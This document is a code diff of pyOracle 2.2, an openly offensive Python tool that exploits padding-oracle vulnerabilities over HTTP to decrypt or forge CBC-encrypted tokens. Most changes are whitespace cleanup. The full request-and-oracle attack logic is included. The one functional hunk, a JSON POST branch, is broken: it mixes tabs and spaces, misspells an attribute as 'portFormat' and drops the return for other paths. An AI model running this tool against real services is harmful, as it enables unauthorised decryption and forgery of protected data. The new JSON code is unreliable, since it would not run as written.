@@ -1,4 +1,4 @@
-# pyOracle 2.1
+# pyOracle 2.2
 # A python padding oracle vulnerability exploitation tool
 # By Paul Mueller (@paulmmueller)
 
@@ -49,7 +49,7 @@ def split_by_n(seq,n):
         yield seq[:n]
         seq = seq[n:]
 
-# append message to log files       
+# append message to log files
 def writeToLog(message):
     ts = str(time.time())
     f = open('pyoracle2.log','a')
@@ -83,8 +83,8 @@ def saveState(job):
     pickleOut = open(outputFileName,"wb")
     pickle.dump(job,pickleOut)
     pickleOut.close()
-    
-# add padding to the end of the string    
+
+# add padding to the end of the string
 def paddify(string,blocksize):
     groups_storage = []
     groups = list(split_by_n(string,blocksize))
@@ -105,18 +105,14 @@ def paddify(string,blocksize):
     paddedstring = ''.join(groups_storage)
     return paddedstring
 
-    
-    
 # The job object holds the state for the encrypt/decrypt operation and contains the majority of the cryptographic code
 class Job:
-    # set variables for the instance 
+    # set variables for the instance
     def __init__(self,blocksize,mode,debug,sourceString,name,ivMode,URL,httpMethod,additionalParameters,httpProxyOn,httpProxyIp,httpProxyPort,headers,iv,oracleMode,oracleText,vulnerableParameter,inputMode,cookies,encodingMode,postFormat):
-    
+
         print('[*]Initializing job....')
-        
         self.name = name
         print(f"\nJob name: {self.name}")
-        
         print(f"[+]Blocksize: {str(blocksize)}")
         self.blocksize = blocksize
         self.mode = mode
@@ -125,14 +121,13 @@ class Job:
         if self.debug == True:
             print(f"[+]Debug Mode ON\n")
         else:
-            print(f"[.]Debug Mode OFF\n")  
+            print(f"[.]Debug Mode OFF\n")
 
         self.sourceString = sourceString
         if self.debug == True:
             print("\n[#]Source String:")
             print(self.sourceString)
-            
-            
+
         self.ivMode = ivMode
         self.iv = iv
         self.URL = URL
@@ -149,19 +144,17 @@ class Job:
         self.inputMode = inputMode
         self.encodingMode = encodingMode
         self.postFormat = postFormat
-            
-            
+
         # establish state on current completed block
         self.currentBlock = 0
-        
 
         # establish initial state on solved blocks
         self.solvedBlocks = {}
- 
-        
+
+
     def initialize(self):
         self.proxy = {}
-    
+
         if self.httpProxyOn:
             self.proxy['http'] = f"http://{self.httpProxyIp}:{self.httpProxyPort}"
             self.proxy['https'] = f"http://{self.httpProxyIp}:{self.httpProxyPort}"
@@ -172,22 +165,22 @@ class Job:
             self.encryptInit()
         else:
             handleError("\n[!]Invalid mode value! Exiting.")
-            
-            
+
+
     def oracleCheck(self,result):
-    
+
         if self.oracleMode == 'search':
             if self.oracleText in result.text:
                 return True
             else:
                 return False
-   
-        elif oracleMode == 'negative': 
+
+        elif oracleMode == 'negative':
             if self.oracleText not in result.text:
                 return True
             else:
                 return False
-               
+
     # make the HTTP request to the target to check current padding array against padding oracle
     def makeRequest(self,encryptedstring):
 
@@ -203,11 +196,11 @@ class Job:
 
 
         if self.httpMethod == "GET":
-        
+
             urlBuilder = self.URL
 
             if self.inputMode == 'parameter':
-                # add the vulnerable parameter 
+                # add the vulnerable parameter
                 urlBuilder = urlBuilder + '?' + self.vulnerableParameter + '=' + encryptedstring
 
                 # if we already set a GET, additionals should start with "&"
@@ -221,16 +214,15 @@ class Job:
                     delimiter = firstDelimiter
                 else:
                     delimiter = '&'
-                urlBuilder = urlBuilder + delimiter + additionalParameter[0] + '=' + additionalParameter[1] 
+                urlBuilder = urlBuilder + delimiter + additionalParameter[0] + '=' + additionalParameter[1]
 
-                         
-            r = requests.get(urlBuilder,headers=self.headers,proxies=self.proxy,verify=False,allow_redirects=False)    
-                
+
+            r = requests.get(urlBuilder,headers=self.headers,proxies=self.proxy,verify=False,allow_redirects=False)
         elif (self.httpMethod == "POST"):
 
             # first, get the additional parameters
             postData = self.additionalParameters.copy()
-            
+
             if self.inputMode == 'parameter':
 
                 # add the vulnerable parameter
@@ -245,8 +237,12 @@ class Job:
                 postData,multipartContentType = encode_multipart(postData)
                 self.headers['Content-Type'] = multipartContentType
                 r = requests.post(self.URL,data=postData,headers=self.headers,proxies=self.proxy,verify=False,allow_redirects=False)
-            
-        return r        
+
+	    elif (self.portFormat == "json"):
+
+		self.headers["Content-Type"] = "application/json"
+                r = requests.post(self.URL,json=postData,headers=self.headers,proxies=self.proxy,verify=False,allow_redirects=False)
+                return r
 
     def fakeIV(self):
         return [0] * self.blocksize
@@ -259,8 +255,7 @@ class Job:
         except:
             print(b''.join(self.solvedBlocks.values()))
         print("##################################")
-        
-        
+
     def verbosePrint(self,padding_array,tempTokenBytes,tempToken,resultText):
         print('[!]LENGTH OF tempTokenBytes: ' + str(len(tempTokenBytes)))
         print('[!]Full result text: ' + resultText)
@@ -273,11 +268,11 @@ class Job:
         print('*************************************************')
         print(tempToken)
         print('*************************************************\n')
-          
+
     def encryptBlockFail(self,padding_array,tempTokenBytes):
         self.decryptBlockFail(padding_array,tempTokenBytes)
-        
-    
+
+
     def decryptBlockFail(self,padding_array,tempTokenBytes):
 
         writeToLog('No characters produced valid padding. For the current block aborting')
@@ -285,23 +280,21 @@ class Job:
         print('*************************************************\n')
         raise Exception("Block failed to decrypt/encrypt, likely a random network error.")
         #sys.exit(2)
-    
+
     def encryptBlock(self):
         print(f'[!]Starting Analysis for block number: {self.currentBlock + 1} OF {self.blockCount}\n')
-               
         padding_array = [0] * self.blocksize
         solved_intermediates = {} # a place to store the solved intermediates
         solved_crypto = {}
         padding_num = 1
         currentbyte = self.blocksize - 1
-  
-        # we start with zeros and back calculate the previous block to match 
-        
+        # we start with zeros and back calculate the previous block to match
+
         if self.currentBlock == 0:
              previousBlock = [0] * self.blocksize
         else:
             previousBlock = list(bytearray(self.solvedBlocks[self.currentBlock - 1]))
-   
+
         for n in range(0,self.blocksize):
             tempblock = self.blocks[self.currentBlock][:]
 
@@ -310,7 +303,7 @@ class Job:
                 print('*************************************************')
                 print(tempblock)
                 print('*************************************************\n')
-                       
+
             count = 0
             solved = False
             while solved == False:
@@ -319,7 +312,6 @@ class Job:
                 padding_array[currentbyte] = count #keep changing the same byte in the previous block
 
                 for k,v in solved_intermediates.items(): #populate the previous bytes with the correct values based on the changing padding but constant intermediates
-                    
                     padding_array[k] = v ^ padding_num
                 tempTokenBytes = bytes(self.fakeIV() + padding_array + previousBlock) 
 
@@ -332,7 +324,6 @@ class Job:
                 if encodingMode == 'hex':
                     tempToken = tempTokenBytes.hex().upper()
                 result = self.makeRequest(tempToken) #make the request with the messed with encryptedstring
-                
 
                 if self.debug:
                     print('[!]Full result text: ' + result.text)
@@ -345,7 +336,7 @@ class Job:
                     print('*************************************************')
                     print(tempToken)
                     print('*************************************************')
-             
+
                 # if the oracleCheck failed... (not solved)
                 if not self.oracleCheck(result):
                     count = count + 1  #increment the count    
@@ -355,17 +346,16 @@ class Job:
                     currenti = count ^ padding_num #if we solved it, get the current intermediate
                     print('[+]The current I value is: ' + str(currenti))
                     solved_intermediates[currentbyte] = currenti    
-                    
+
                     #XOR the intermediate and the actual plain text to determine the cipher byte for the next (previous) block      
                     currentcrypto = (self.blocks[self.currentBlock][currentbyte]) ^ currenti 
                     print(f'[+]crypto value of this char in the next (previous) block is: {str(currentcrypto)}\n')
                     solved_crypto[currentbyte] = currentcrypto
                     if self.debug:
                         print(f'[+]cross-check padding level: {str(currenti ^ padding_array[currentbyte])}\n')
-                    
+
             padding_num = padding_num + 1 #increment padding_num and decrement currentbyte
-            currentbyte = currentbyte - 1    
-            
+            currentbyte = currentbyte - 1
 
         blockresult = bytes(reversed(list(solved_crypto.values())))
         print('\n*************************************************')
@@ -374,48 +364,42 @@ class Job:
         print('*************************************************\n')
         writeToLog(f'[!]BLOCK SOLVED: {blockresult}')
         return blockresult
-        
+
     def decryptBlock(self):
         print(f"[!]Starting Analysis for block number: {self.currentBlock} OF {self.blockCount}\n")
-        
         padding_array = [0] * self.blocksize
         solved_intermediates = {} # a place to store the solved intermediates
         solved_reals = {}
-        
         padding_num = 1 #starting at padding one, increase as we work backwards
         currentbyte = self.blocksize - 1 #start at the last byte according to the length of block
-        
-        # if we are on the first block use the IV as the 'previousBlock' 
+        # if we are on the first block use the IV as the 'previousBlock'
         if self.currentBlock == 0:
             if self.ivMode == "firstblock" or self.ivMode == "knownIV":
                 previousBlock = self.iv
             else:
-                #This should only happen if we are using unknown IV  
+                #This should only happen if we are using unknown IV
                 currentIV = self.fakeIV()
         else:
             previousBlock = self.blocks[self.currentBlock - 1]
-                    
         for n in range(0,self.blocksize):
             tempblock = self.blocks[self.currentBlock][:] #make a copy of the byte array that we can mess with
-            
 
             if self.debug:
                 print('[*]CURRENT BLOCK DECIMAL:')
                 print('*************************************************')
                 print(tempblock)
                 print('*************************************************\n')
-                
+
             count = 0
             solved = False
-            while solved == False:       
+            while solved == False:
                 # We tried all possible bytes for this position and failed. Something isn't working. 
                 if count > 255:
                     self.decryptBlockFail(padding_array,tempTokenBytes)
                 padding_array[currentbyte] = count #keep changing the same byte in the previous block
                 for k,v in solved_intermediates.items():
                     padding_array[k] = v ^ padding_num
-                    
-                    
+
                 tempTokenBytes = bytearray(self.fakeIV() + padding_array + tempblock) #put the bytes back together into a string
 
                 if self.encodingMode == 'base64':
@@ -431,31 +415,28 @@ class Job:
 
                 if self.debug:
                     self.verbosePrint(padding_array,tempTokenBytes,tempToken,result.text)
-          
+
                 # if the oracleCheck failed... (not solved)
                 if not self.oracleCheck(result):
-                    count = count + 1  #increment the count  
-      
+                    count = count + 1  #increment the count
+
                 else:
-             
                     print('[+]SOLVED FOR BYTE NUMBER: ' + str(currentbyte))
-        
                     solved = True
                     currenti = count ^ padding_num #if we solved it, get the current intermediate
                     print('[+]The current I value is: ' + str(currenti))
-                    solved_intermediates[currentbyte] = currenti         
+                    solved_intermediates[currentbyte] = currenti
                     currentreal = (previousBlock[currentbyte]) ^ currenti #use the current intermediate, and the real last block encryption to find the current real
                     print('[+]real value of last char is: ' + str(currentreal) + '\n')
                     solved_reals[currentbyte] = currentreal
                     if self.debug:
                         print('[+]cross-check padding level:' + str(currenti ^ padding_array[currentbyte]) + '\n')
-            # increment padding_num and decrement currentbyte   
-            padding_num = padding_num + 1 
+            # increment padding_num and decrement currentbyte
+            padding_num = padding_num + 1
             currentbyte = currentbyte - 1
-            
+
         blockresult = bytes(reversed(list(solved_reals.values())))
- 
-        
+
         # Attempt to convert to an ascii string. If it fails, something probably went wrong.
         try:
             blockresultString = blockresult.decode()
@@ -468,7 +449,7 @@ class Job:
         return blockresult
 
     def nextBlock(self):
-        
+
         if self.mode == 'decrypt':
             try:
                 result = self.decryptBlock()
@@ -477,8 +458,6 @@ class Job:
                 writeToLog(f'[!] decryption of block {self.currentBlock} failed. Error message: {e}')
                 print(f'[!] decryption of block {self.currentBlock} failed. Error message: {e}')
                 return 1
-            
-        
         if self.mode == 'encrypt':
             try:
                 result = self.encryptBlock()
@@ -486,19 +465,18 @@ class Job:
                 writeToLog(f'[!] encryption of block {self.currentBlock} failed. Error message: {e}')
                 print(f'[!] encryption of block {self.currentBlock} failed. Error message: {e}')
                 return 1
-                
-              
+
         # add the result to solvedBlocks. We may have to remove it again if we fail the oracleCheck sanity check.
         self.solvedBlocks[self.currentBlock] = result
 
         if self.mode == 'encrypt':
-              
+
             # combine all of the blocks into one decimal list
             joinedCrypto = b''.join(reversed(list(job.solvedBlocks.values())))
-                  
+
             # add in the "first" (last) block of all 0's
             joinedCrypto = b''.join([joinedCrypto,bytes([0] * job.blocksize)])
-            
+
             if encodingMode == 'base64':
                 encryptTemp = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))#
 
@@ -508,7 +486,7 @@ class Job:
             if encodingMode == 'hex':
                 encryptTemp = joinedCrypto.hex().upper()
             oracleCheckResult = self.makeRequest(encryptTemp) #make the request with the messed with encryptedstring
-           
+
             #if the oracleCheck failed... (not solved)
             if not self.oracleCheck(oracleCheckResult):
                 writeToLog(f'[!] encryption of block {self.currentBlock} failed. Reason: Sanity Check failed.')
@@ -519,12 +497,12 @@ class Job:
 
         return 0
 
-    # initialize variables necessary to perform decryption. 
+    # initialize variables necessary to perform decryption.
     def decryptInit(self):
-        
+
         # Run the string through a URL decoder
         unquoted_sourcestring = urllib.parse.unquote(args.input)
-  
+
         # decode the encrypted string
 
         if (encodingMode == 'base64') or (encodingMode == 'base64Url'):
@@ -544,34 +522,34 @@ class Job:
 
         # Save the bytemap to the object in case operation is interupted
         self.bytemap = bytemap
-    
+
          # initialize the blocks array
         self.blocks = []
-        
+
         # we have to recreate the byte array, not just reference it
         actualBlocks = self.bytemap[:]
-        
+
         #Get the block count and save it to the instance
         print(actualBlocks)
         print(int(len(actualBlocks)))
-        self.blockCount = int((len(actualBlocks) / self.blocksize))                
-        
+        self.blockCount = int((len(actualBlocks) / self.blocksize))
+
         # if the mode is 'firstblock' we need to remove the first block and assign it as the IV
         if self.ivMode == "firstblock":
-            self.iv = actualBlocks[0:self.blocksize]   
+            self.iv = actualBlocks[0:self.blocksize]
             # push forward one block length
             actualBlocks = actualBlocks[blocksize:]
             self.blockCount = self.blockCount - 1
-            
+
         # if the mode is unknown, we can just set the IV to zeros. The first block won't work, but everything else will. 
         elif ivMode == 'unknown':
             self.iv = [0] * self.blocksize
-            
+
         # if the mode is knownIV, it is already set
 
         # Display the block count
         print(f"\n[+] (non-IV) Block Count: {self.blockCount}")
-        
+
         if self.debug:
             print('\n[#]decimal representation of the decoded token value'  + '\n')
             print('*************************************************')
@@ -580,60 +558,58 @@ class Job:
 
         # iterate through the block array and separate the blocks
         for x in range (0,self.blockCount):
-        
+
             # take the next block off and add it to self.blocks
             self.blocks.append(actualBlocks[0:self.blocksize])
-            
+
             # push forward one block length
             actualBlocks = actualBlocks[blocksize:]
-            
+
         if self.debug:
             print('*************************************************\n')
-            print('\n[*]Initialization Vector (IV) value:')  
-            print(self.iv)   
+            print('\n[*]Initialization Vector (IV) value:')
+            print(self.iv)
             print('*************************************************\n')
-                
+
     def encryptInit(self):
-     
+
         # set the text to encrypt and paddify it
-        self.encryptText = paddify(args.input,self.blocksize)    
+        self.encryptText = paddify(args.input,self.blocksize)
         print(f"[+]Raw encrypt string: {args.input}")
         print(f"[+]Padded encrypt string: {self.encryptText}")
-            
+
         # the mode is knownIV or unknownIV, we cant encrypt the first block. It should be possible to encrypt all other blocks, but we will add this later.
         if not self.ivMode == "firstblock":
             print("[!]Support for encrypting with knownIV or unknownIV mode is not currently in place")
             sys.exit(2)
-             
+
         # Save the bytemap to the object in case operation is interupted
         bytemap = str.encode(self.encryptText)
         self.bytemap = bytemap
-              
+
          # initialize the blocks array
         self.blocks = []
-        
+
         # we have to recreate the byte array, not just reference it
         actualBlocks = self.bytemap[:]
         # print(actualBlocks)
 
         #Get the block count and save it to the instance
         self.blockCount = int((len(self.bytemap) / self.blocksize))
-              
+
         # iterate through the block array and separate the blocks
         for x in range (0,self.blockCount):
-        
+
             # take the next block off and add it to self.blocks
             self.blocks.append(actualBlocks[0:self.blocksize])
-            
+
             # push forward one block length
             actualBlocks = actualBlocks[blocksize:]
-            
+
         # Encryption works by starting at the last block and working backwards. Therefore, we will reverse the blocks.
         self.blocks = list(reversed(self.blocks))
 
 
-    
- 
 # argparse setup
 parser = argparse.ArgumentParser()
 parser.add_argument("-r", "--restore", type=str,help="Specify a state file to restore from")
@@ -650,12 +626,11 @@ if args.restore:
     if (args.input or args.mode or args.debug):
         handleError("\n[x] In restore mode no other options should be set! Exiting.")
 
-        
-# make sure that required parameters are present and validated        
+# make sure that required parameters are present and validated
 else:
     if ((not args.mode) or (not args.input) or (not args.config)):
         handleError("\n[x] Mode (-m), Config (-c), and input (-i) are required parameters. Exiting")
-        
+
     if ((args.mode != 'encrypt') and (args.mode != 'decrypt') and (args.mode != 'd') and (args.mode != 'e')):
         handleError("\n[x] Mode must be set to either 'encrypt' / 'decrypt' or e / d. Exiting.")
     else:
@@ -663,23 +638,19 @@ else:
             args.mode = 'encrypt'
         if args.mode == 'd':
             args.mode = 'decrypt'
-            
-            
-# Proceed with resume function            
+
+# Proceed with resume function
 if args.restore:
     print(f"\n[!]RESTORE MODE INTIATED. Attempting to restart job from file {args.restore}")
-    
-    pickleFile = open(args.restore, 'rb')           
+
+    pickleFile = open(args.restore, 'rb')
     job = pickle.load(pickleFile)
     pickleFile.close()
- 
     print(job.name)
     print(job.solvedBlocks)
     print(job.currentBlock)
     job.printProgress()
- 
 
-  
 # Proceed with a new job
 else:
 
@@ -712,15 +683,11 @@ else:
     inputMode = config['default']['inputMode']
     encodingMode = config['default']['encodingMode']
     postFormat = config['default']['postFormat']
-    
     # config value validation
-    
-    
     # validate oracleMode
     if not oracleMode:
         handleError("[x]CONFIG ERROR: oracleMode required")
 
-        
     else:
         if ((oracleMode != "search") and (oracleMode != "negative")):
             handleError("[x]CONFIG ERROR: invalid oracleMode")
@@ -733,7 +700,6 @@ else:
         validEncodingModes = ['base64','base64Url','hex']
         if (encodingMode not in validEncodingModes):
             handleError("[x]CONFIG ERROR: invalid encodingMode")
-    
 
     # Validate HTTP Method
     if ((httpMethod != "GET") and (httpMethod != "POST")):
@@ -750,12 +716,10 @@ else:
            # handleError("[x]CONFIG ERROR: multipart mode not supported yet :(")
         else:
             handleError("[x]CONFIG ERROR: When httpMethod is POST postFormat must be 'form-urlencoded' or 'multipart'")   
-        
     # validate proxy IP
     if httpProxyIp:
         try:
             socket.inet_aton(httpProxyIp)
-            
         except socket.error:
             handleError("[x]CONFIG ERROR: proxy ip is not a valid IP address.")
 
@@ -766,12 +730,9 @@ else:
         except:
             handleError("[x]CONFIG ERROR: proxy port is not valid INT")
 
-        
         if not (httpProxyPort <= 65535):
             handleError("[x]CONFIG ERROR: proxy port is not a valid port number")
 
-            
-            
     # validate block size
     try:
         blocksize = int(blocksize)
@@ -783,30 +744,24 @@ else:
     if not validators.url(URL):
         handleError("[x]CONFIG ERROR: URL is not valid.")
 
-        
-        
     # validate ivMode
     if not ivMode:
         handleError("[x]CONFIG ERROR: ivMode is required.")
-      
-        
-    
     else:
         if not ((ivMode == 'firstblock') or (ivMode == 'knownIV') or (ivMode == 'unknown')):
             print(f"[x]CONFIG ERROR: iVMode: '{ivMode}' invalid.")
             handleError("[!]Valid ivMode values: firstblock, knownIV, or unknown")
 
     # validate iv
-    
+
     # iv required if in knownIV mode
     if ivMode == 'knownIV':
         if not iv:
             handleError("[x]CONFIG ERROR: iv is required when in IV mode")
-        
+
         if len(iv) != blocksize:
             handleError("[x]CONFIG ERROR: iv must be the same length as blocksize")
 
-            
         if not (all(isinstance(x, int) for x in iv)):
             handleError("[x]CONFIG ERROR: IV is not properly formatted. Not all values are type INT")
 
@@ -819,19 +774,18 @@ print(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following 
 writeToLog(f'Starting job in {job.mode} mode. Attempting to {job.mode} the following string: {args.input}')
 
 while job.currentBlock < (job.blockCount):
-       
     result = job.nextBlock()
     if result == 0:
 
         #Since the block was sucessful, roll to the next one
         job.currentBlock = job.currentBlock + 1
-        
+
         #Save the current state so that it can be resumed later
         saveState(job)
-        
-        #Print the current progress so far       
+
+        #Print the current progress so far
         job.printProgress()
-        
+
     else:
         print(f"[!]Something went wrong with block {job.currentBlock}. Will repeat block")
 
@@ -846,10 +800,10 @@ if job.mode == "encrypt":
 
         # combine all of the blocks into one decimal list
         joinedCrypto = b''.join(reversed(list(job.solvedBlocks.values())))
-         
+
         #joinedCrypto = b''.join(list(job.solvedBlocks.values()))
         joinedCrypto = joinedCrypto[(-1 - xxx) * 16:]
-     
+
         # add in the "first" (last) bock of all 0's
         joinedCrypto = b''.join([joinedCrypto,bytes([0] * job.blocksize)])
 
@@ -863,7 +817,6 @@ if job.mode == "encrypt":
         encryptFinal = joinedCrypto.hex().upper()
 
     print(f"[!]Encrypt final result: {encryptFinal}")
-        
 
 # All blocks completed
 
